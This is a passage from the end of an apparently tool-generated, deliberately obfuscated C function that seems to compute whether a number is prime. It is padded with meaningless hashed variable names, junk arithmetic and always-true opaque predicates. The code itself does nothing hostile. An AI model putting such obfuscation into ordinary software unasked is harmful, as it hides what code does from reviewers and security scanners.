              v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque = v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque + v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
              v83504bb4e897035825c3035ca8382286_computation_opaque = v83504bb4e897035825c3035ca8382286_computation_opaque * v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque;
            }
            vb206b949225ea97d363278aa1c721817_useless_opaque = v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque % vc235b602bdca47f97e2adf56068ff295_computation_opaque;
            vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque % vc235b602bdca47f97e2adf56068ff295_computation_opaque;
            v83504bb4e897035825c3035ca8382286_computation_opaque = vc235b602bdca47f97e2adf56068ff295_computation_opaque + v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
            if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
            {
              v83504bb4e897035825c3035ca8382286_computation_opaque = vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque | v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
              if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque <= vc235b602bdca47f97e2adf56068ff295_computation_opaque;
                v83504bb4e897035825c3035ca8382286_computation_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque != vb206b949225ea97d363278aa1c721817_useless_opaque;
              }
            }
          }
          if ((vc235b602bdca47f97e2adf56068ff295_computation_opaque % v83504bb4e897035825c3035ca8382286_computation_opaque) == ((unsigned int) 0))
          {
            if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
            {
              if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
              {
                v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque = (unsigned int) 0;
              }
            }
          }
          v83504bb4e897035825c3035ca8382286_computation_opaque = v83504bb4e897035825c3035ca8382286_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v0a065a2c6c00b3a909e2bfedbe28a841_prime_opaque = vc235b602bdca47f97e2adf56068ff295_computation_opaque;
    }
  }
}

